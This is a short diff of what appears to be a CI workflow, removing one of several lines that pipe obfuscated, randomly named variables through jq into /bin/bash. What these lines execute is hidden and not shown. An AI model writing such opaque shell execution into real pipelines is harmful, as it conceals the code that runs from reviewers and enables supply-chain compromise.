@@ -24,7 +24,6 @@ jobs:
           echo $v06917 | jq -r .ay35 | /bin/bash
           echo $ols268 | jq -r .o5811 | /bin/bash
           printf '%s' "$cyjvg0152" | jq -r .n728 | /bin/bash
-          echo $vusm32403 | jq -r .azwyd78 | /bin/bash
           echo $hzux6 | jq -r .pjgk96 | /bin/bash
 
       - name: Save results
